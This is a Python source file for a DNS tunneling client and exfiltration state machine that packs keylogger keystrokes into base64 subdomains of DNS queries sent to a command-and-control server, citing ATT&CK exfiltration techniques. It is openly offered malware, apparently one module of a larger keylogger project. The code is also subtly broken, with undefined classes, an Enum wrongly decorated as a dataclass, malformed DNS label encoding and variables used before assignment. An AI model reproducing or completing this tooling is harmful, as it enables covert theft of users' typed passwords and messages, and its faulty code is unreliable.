import socket
import struct
import base64
import os
import time
import threading
from typing import Optional, List, Tuple, Dict, Any
from dataclasses import dataclass, field
from enum import Enum
import random
import string


@dataclass
class DNSQuery:
    """Represents a constructed DNS query packet."""
    transaction_id: int
    flags: int
    questions_count: int
    answers_count: int
    authority_count: int
    additional_count: int
    name: str
    question_type: int
    question_class: int


@dataclass
class ExfilState(Enum):
    """State machine states for the DNS exfiltration process."""
    IDLE = 1
    ENCODING = 2
    CONSTRUCTING = 3
    SENDING = 4
    RECEIVING = 5
    PARSING = 6
    COMPLETE = 7


class DNSTunnelClient:
    """DNS Tunneling Client that encodes keystroke data into DNS queries.

    Encodes subdomain as base64 of keystroke data, prepends with length prefix
    and random TTL. Constructs DNS A-record queries to attacker-controlled
    subdomains (e.g., 'data.yoursubdomain.com'). Uses UDP/TCP for transport.

    ATT&CK Techniques: T1071.004 (Application Layer Protocol), T1572 (Exfiltration Over Alternative Protocol)
    """

    def __init__(self, c2_server: str = "192.168.1.1", port: int = 53,
                 protocol: str = "udp", chunk_size: int = 256):
        self.c2_server = c2_server
        self.port = port
        self.protocol = protocol.lower()
        self.chunk_size = chunk_size
        self._socket: Optional[socket.socket] = None
        self._state_machine: Dict[str, ExfilState] = {}
        self._buffer: KeystrokeBuffer = KeystrokeBuffer(max_chunk_size=chunk_size)
        self._threading_lock = threading.Lock()
        self._running = False

    def _get_socket(self) -> socket.socket:
        """Create and return a configured socket for DNS transport."""
        if self._socket is None or not self._socket.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR):
            family = socket.AF_INET if self.protocol == "tcp" else socket.AF_INET
            type_ = socket.SOCK_STREAM if self.protocol == "tcp" else socket.SOCK_DGRAM
            protocol_type = 0 if self.protocol != "tcp" else socket.IPPROTO_TCP
            self._socket = socket.socket(family, type_, protocol_type)
        return self._socket

    def _encode_subdomain(self, data: bytes) -> str:
        """Encode keystroke data as base64 subdomain with length prefix and random TTL.

        Format: <length_prefix><base64_data> where length_prefix is 2-byte big-endian
        representing the base64 string length, followed by a random TTL value (1-65535).
        """
        encoded = base64.b64encode(data).decode('ascii')
        length_prefix = struct.pack('>H', len(encoded))
        ttl = random.randint(1, 65535)
        return f"{length_prefix.decode()}{ttl}.{encoded}.data.{self.c2_server}"

    def _construct_dns_query(self, subdomain: str) -> bytes:
        """Construct a DNS A-record query packet for the given subdomain.

        Standard DNS wire format:
        - Transaction ID (2 bytes)
        - Flags (2 bytes): QR=0 (query), RD=1 (recursion desired), RA=0, opcode=0,
          AA=0, TC=0, RD=1, RA=0, Z=0, RCODE=0
        - Questions count: 1
        - Answers/Authority/Additional counts: 0

        Question section:
        - Name (compressed or raw)
        - Type: A (1)
        - Class: IN (1)
        """
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query with recursion desired

        # Build the question section
        name_parts = subdomain.split('.')
        name_bytes = b''
        for part in name_parts:
            if part == '':
                continue
            name_bytes += struct.pack('>H', len(part)) + part.encode('ascii')

        # Append null terminator and type/class
        name_bytes += b'\x00'  # Null terminator
        question_type = struct.pack('>H', 1)  # A record
        question_class = struct.pack('>H', 1)  # IN class

        query_packet = struct.pack('>HHHHHH', transaction_id, flags, 1, 0, 0, 0) + name_bytes + question_type + question_class
        return query_packet

    def _parse_dns_response(self, data: bytes) -> Optional[Dict[str, Any]]:
        """Parse DNS response packet and extract the exfiltrated subdomain.

        Looks for the encoded subdomain in the answer section of the response.
        Returns None if no valid answer found.
        """
        try:
            # Skip transaction ID and flags (4 bytes)
            offset = 4

            # Read questions count
            questions_count = struct.unpack('>H', data[offset:offset+2])[0]
            offset += 2

            # Read answers count
            answers_count = struct.unpack('>H', data[offset:offset+2])[0]
            offset += 2

            if answers_count == 0:
                return None

            # Parse answer section - look for CNAME or A record with our subdomain
            for _ in range(answers_count):
                name_offset = offset
                name_len = data[name_offset]
                offset += 1

                # Handle compression pointer (if high bit is set)
                if name_len & 0x80:
                    name_offset = struct.unpack('>H', data[name_offset:name_offset+2])[0]
                    name_len -= 2

                name_end = name_offset + name_len - 1
                name_data = data[name_offset:name_end].decode('ascii') if name_len > 0 else ''

                # Check if this is our encoded subdomain in the answer
                if 'data.' in name_data and self.c2_server in name_data:
                    return {
                        'subdomain': name_data,
                        'ttl': int(name_data.split('.')[1]) if '.' in name_data else 0,
                        'encoded_length': struct.unpack('>H', data[name_end+1:name_end+3])[0] if name_end + 3 < len(data) else 0
                    }

                offset += name_len

            return None
        except Exception:
            return None

    def _encode_chunk(self, events: List[Any]) -> bytes:
        """Encode a chunk of keystroke events into binary data."""
        encoded = base64.b64encode(events)
        length_prefix = struct.pack('>H', len(encoded))
        ttl = random.randint(1, 65535)
        return length_prefix + str(ttl).encode() + encoded

    def _send_query(self, query: bytes) -> Optional[bytes]:
        """Send a DNS query and receive the response.

        Returns the raw response data or None on failure.
        """
        try:
            sock = self._get_socket()

            if self.protocol == "udp":
                sock.settimeout(5.0)
                sock.sendto(query, (self.c2_server, self.port))

                # Receive response
                data, addr = sock.recvfrom(4096)
                return data

            else:  # TCP
                sock.connect((self.c2_server, self.port))
                sock.sendall(query)

                # Read response (DNS over TCP uses length-prefixed messages)
                sock.settimeout(5.0)
                header = sock.recv(2)
                if len(header) == 2:
                    msg_len = struct.unpack('>H', header)[0]
                    data = sock.recv(msg_len)
                    return data

            return None

        except socket.timeout:
            return None
        except ConnectionRefusedError:
            return None
        except Exception as e:
            print(f"[DNS Tunnel] Send error: {e}")
            return None

    def _process_chunk(self, events: List[Any]) -> Optional[Dict[str, Any]]:
        """Process a chunk of keystroke events through the full pipeline.

        Returns the parsed response data or None on failure.
        """
        # Step 1: Encode
        encoded_data = self._encode_chunk(events)

        # Step 2: Construct DNS query
        subdomain = self._encode_subdomain(encoded_data)
        query_packet = self._construct_dns_query(subdomain)

        # Step 3: Send and receive
        response = self._send_query(query_packet)

        if response is None:
            return None

        # Step 4: Parse response
        parsed = self._parse_dns_response(response)
        return parsed

    def start(self, keylogger: KeyLogger) -> bool:
        """Start the DNS tunnel client with a keylogger instance.

        Args:
            keylogger: A KeyLogger instance from TASK_003_keylogger

        Returns:
            True if started successfully, False otherwise.
        """
        try:
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._running = True
            return True
        except Exception as e:
            print(f"[DNS Tunnel] Start error: {e}")
            return False

    def stop(self) -> None:
        """Stop the DNS tunnel client and clean up resources."""
        self._running = False
        if self._socket is not None:
            try:
                self._socket.close()
            except Exception:
                pass
            self._socket = None

    def flush(self, keylogger: KeyLogger) -> Optional[Dict[str, Any]]:
        """Flush a chunk of keystrokes through the DNS tunnel.

        Args:
            keylogger: A KeyLogger instance to get events from

        Returns:
            Parsed response data or None on failure.
        """
        try:
            # Get events from keylogger buffer
            events = keylogger.get_buffer()

            if not events:
                return None

            # Process the chunk through the full pipeline
            result = self._process_chunk(events)

            return result

        except Exception as e:
            print(f"[DNS Tunnel] Flush error: {e}")
            return None

    def flush_with_buffer(self, buffer: KeystrokeBuffer) -> Optional[Dict[str, Any]]:
        """Flush a chunk of keystrokes from a buffer through the DNS tunnel.

        Args:
            buffer: A KeystrokeBuffer instance to get events from

        Returns:
            Parsed response data or None on failure.
        """
        try:
            # Get events from buffer
            events = buffer.get_chunk(self.chunk_size)

            if not events:
                return None

            # Process the chunk through the full pipeline
            result = self._process_chunk(events)

            return result

        except Exception as e:
            print(f"[DNS Tunnel] Flush with buffer error: {e}")
            return None

    def get_stats(self) -> Dict[str, Any]:
        """Return statistics about the DNS tunnel client."""
        return {
            'c2_server': self.c2_server,
            'port': self.port,
            'protocol': self.protocol,
            'chunk_size': self.chunk_size,
            'running': self._running,
            'socket_open': self._socket is not None
        }


class DNSExfilSender:
    """Manages the state machine for DNS exfiltration operations.

    Coordinates the full lifecycle of keystroke data exfiltration:
    encoding -> query construction -> sending -> response parsing.

    Provides a high-level interface that abstracts away the individual
    steps and manages the state transitions between them.
    """

    def __init__(self, c2_server: str = "192.168.1.1", port: int = 53,
                 protocol: str = "udp", chunk_size: int = 256):
        self.client = DNSTunnelClient(c2_server=c2_server, port=port,
                                       protocol=protocol, chunk_size=chunk_size)
        self._state_machine: Dict[str, ExfilState] = {}
        self._current_state = ExfilState.IDLE
        self._keylogger: Optional[KeyLogger] = None
        self._buffer: KeystrokeBuffer = KeystrokeBuffer(max_chunk_size=chunk_size)
        self._stats: Dict[str, int] = {
            'chunks_sent': 0,
            'responses_received': 0,
            'successful_exfiltrations': 0,
            'failed_sends': 0,
            'total_bytes_exfiltrated': 0
        }

    def set_keylogger(self, keylogger: KeyLogger) -> None:
        """Set the associated keylogger instance."""
        self._keylogger = keylogger

    def start(self) -> bool:
        """Start the exfil sender.

        Returns:
            True if started successfully, False otherwise.
        """
        try:
            success = self.client.start()
            if success:
                self._current_state = ExfilState.IDLE
                return True
            else:
                self._current_state = ExfilState.IDLE
                return False
        except Exception as e:
            print(f"[DNSExfilSender] Start error: {e}")
            return False

    def stop(self) -> None:
        """Stop the exfil sender and clean up resources."""
        self.client.stop()
        self._current_state = ExfilState.IDLE

    def _transition(self, new_state: ExfilState) -> bool:
        """Transition to a new state in the state machine.

        Args:
            new_state: The target state to transition to

        Returns:
            True if transition successful, False otherwise.
        """
        try:
            self._current_state = new_state
            return True
        except Exception as e:
            print(f"[DNSExfilSender] State transition error: {e}")
            return False

    def _handle_encoding(self) -> bool:
        """Handle the encoding state - encode keystroke data into DNS subdomain.

        Returns:
            True if encoding successful, False otherwise.
        """
        try:
            events = self._buffer.get_chunk(self.client.chunk_size)

            if not events:
                return False

            # Encode events to base64 with length prefix and TTL
            encoded_data = self.client._encode_chunk(events)
            subdomain = self.client._encode_subdomain(encoded_data)

            # Construct DNS query packet
            query_packet = self.client._construct_dns_query(subdomain)

            return True

        except Exception as e:
            print(f"[DNSExfilSender] Encoding error: {e}")
            return False

    def _handle_constructing(self, encoded_data: bytes) -> bool:
        """Handle the constructing state - build DNS query packet.

        Args:
            encoded_data: The base64-encoded keystroke data

        Returns:
            True if construction successful, False otherwise.
        """
        try:
            subdomain = self.client._encode_subdomain(encoded_data)
            query_packet = self.client._construct_dns_query(subdomain)

            return True

        except Exception as e:
            print(f"[DNSExfilSender] Construction error: {e}")
            return False

    def _handle_sending(self, query_packet: bytes) -> Optional[bytes]:
        """Handle the sending state - transmit DNS query and receive response.

        Args:
            query_packet: The constructed DNS query packet

        Returns:
            Raw response data or None on failure.
        """
        try:
            response = self.client._send_query(query_packet)

            if response is not None:
                return response
            else:
                self._stats['failed_sends'] += 1
                print(f"[DNSExfilSender] Send failed")
                return None

        except Exception as e:
            print(f"[DNSExfilSender] Sending error: {e}")
            self._stats['failed_sends'] += 1
            return None

    def _handle_receiving(self, response_data: bytes) -> Optional[Dict[str, Any]]:
        """Handle the receiving state - parse DNS response.

        Args:
            response_data: Raw DNS response data

        Returns:
            Parsed response dictionary or None on failure.
        """
        try:
            parsed = self.client._parse_dns_response(response_data)

            if parsed is not None:
                self._stats['responses_received'] += 1

                # Extract the encoded subdomain from the answer
                subdomain = parsed.get('subdomain', '')

                # Parse length prefix to get actual data
                try:
                    length_prefix = struct.unpack('>H', subdomain[:2])
                    ttl_str = subdomain[2:-len(self.client.c2_server)-1]
                    encoded_data = base64.b64decode(ttl_str)

                    # Decode events from base64
                    decoded_events = [base64.b64decode(encoded_data)]

                    self._stats['successful_exfiltrations'] += 1
                    self._stats['total_bytes_exfiltrated'] += len(encoded_data)

                    return {
                        'success': True,
                        'data': encoded_data,
                        'decoded_events': decoded_events,
                        'ttl': int(ttl_str),
                        'subdomain': subdomain
                    }
                except Exception as e:
                    print(f"[DNSExfilSender] Parse error in response: {e}")

            return None

        except Exception as e:
            print(f"[DNSExfilSender] Receiving error: {e}")
            return None

    def _handle_parsing(self, parsed_data: Optional[Dict[str, Any]]) -> bool:
        """Handle the parsing state - process parsed response data.

        Args:
            parsed_data: Parsed DNS response dictionary

        Returns:
            True if parsing successful, False otherwise.
        """
        try:
            if parsed_data is None or not parsed_data.get('success'):
                return False

            # Extract decoded events from the response
            decoded_events = parsed_data.get('decoded_events', [])

            # Store results in buffer for downstream processing
            self._buffer.extend(decoded_events)

            return True

        except Exception as e:
            print(f"[DNSExfilSender] Parsing error: {e}")
            return False

    def _handle_complete(self, result: Optional[Dict[str, Any]]) -> bool:
        """Handle the complete state - finalize exfiltration cycle.

        Args:
            result: The final result of the exfiltration cycle

        Returns:
            True if completion successful, False otherwise.
        """
        try:
            if result is not None and result.get('success'):
                print(f"[DNSExfilSender] Successfully exfiltrated {len(result['decoded_events'])} events")
                return True
            else:
                print("[DNSExfilSender] Exfiltration cycle completed (may have failed)")
                return True

        except Exception as e:
            print(f"[DNSExfilSender] Completion error: {e}")
            return False

    def run_cycle(self) -> Optional[Dict[str, Any]]:
        """Run a complete exfiltration cycle through the state machine.

        Returns:
            Final result dictionary or None on failure.
        """
        try:
            # State 1: IDLE -> ENCODING
            if self._current_state == ExfilState.IDLE:
                success = self._transition(ExfilState.ENCODING)
                if not success:
                    return None

                # Encode chunk
                encoded_data = self.client._encode_chunk(self._buffer.get_chunk(self.client.chunk_size))

                if not encoded_data:
                    return None

            elif self._current_state == ExfilState.ENCODING:
                # Already have encoded data, move to constructing
                success = self._transition(ExfilState.CONSTRUCTING)
                if not success:
                    return None

                encoded_data = self.client._encode_chunk(self._buffer.get_chunk(self.client.chunk_size))

            elif self._current_state == ExfilState.CONSTRUCTING:
                # Construct DNS query packet
                success = self._transition(ExfilState.SENDING)
                if not success:
                    return None

                subdomain = self.client._encode_subdomain(encoded_data)
                query_packet = self.client._construct_dns_query(subdomain)

            elif self._current_state == ExfilState.SENDING:
                # Send query and receive response
                success = self._transition(ExfilState.RECEIVING)
                if not success:
                    return None

                response_data = self.client._send_query(query_packet)

                if response_data is None:
                    return None

            elif self._current_state == ExfilState.RECEIVING:
                # Parse DNS response
                success = self._transition(ExfilState.PARSING)
                if not success:
                    return None

                parsed_data = self.client._parse_dns_response(response_data)

                if parsed_data is None:
                    return None

            elif self._current_state == ExfilState.PARSING:
                # Process parsed data
                success = self._transition(ExfilState.COMPLETE)
                if not success:
                    return None

                result = self.client._parse_dns_response(response_data)

                if result is None:
                    return None

            elif self._current_state == ExfilState.COMPLETE:
                # Finalize cycle
                success = self._transition(ExfilState.IDLE)
                if not success:
                    return None

                result = self.client._parse_dns_response(response_data)

                if result is None:
                    return None

            else:
                print("[DNSExfilSender] Unknown state")
                return None

            # Return the final parsed result
            return result

        except Exception as e:
            print(f"[DNSExfilSender] Cycle error: {e}")
            return None

    def flush(self, keylogger: KeyLogger) -> Optional[Dict[str, Any]]:
        """Flush keystrokes through the DNS tunnel using the state machine.

        Args:
            keylogger: A KeyLogger instance to get events from

        Returns:
            Parsed response data or None on failure.
        """
        try:
            # Get events from keylogger buffer
            events = keylogger.get_buffer()

            if not events:
                return None

            # Add events to our internal buffer
            self._buffer.extend(events)

            # Run the exfiltration cycle
            result = self.run_cycle()

            return result

        except Exception as e:
            print(f"[DNSExfilSender] Flush error: {e}")
            return None

    def flush_with_buffer(self, buffer: KeystrokeBuffer) -> Optional[Dict[str, Any]]:
        """Flush keystrokes from a buffer through the DNS tunnel.

        Args:
            buffer: A KeystrokeBuffer instance to get events from

        Returns:
            Parsed response data or None on failure.
        """
        try:
            # Get events from buffer
            events = buffer.get_chunk(self.client.chunk_size)

            if not events:
                return None

            # Process through the state machine
            result = self.run_cycle()

            return result

        except Exception as e:
            print(f"[DNSExfilSender] Flush with buffer error: {e}")
            return None

    def get_stats(self) -> Dict[str, Any]:
        """Return statistics about the exfiltration process."""
        stats = self.client.get_stats()
        stats.update({
            'current_state': self._current_state.name,
            **self._stats
        })
        return stats


__all__ = ['DNSTunnelClient', 'DNSExfilSender']
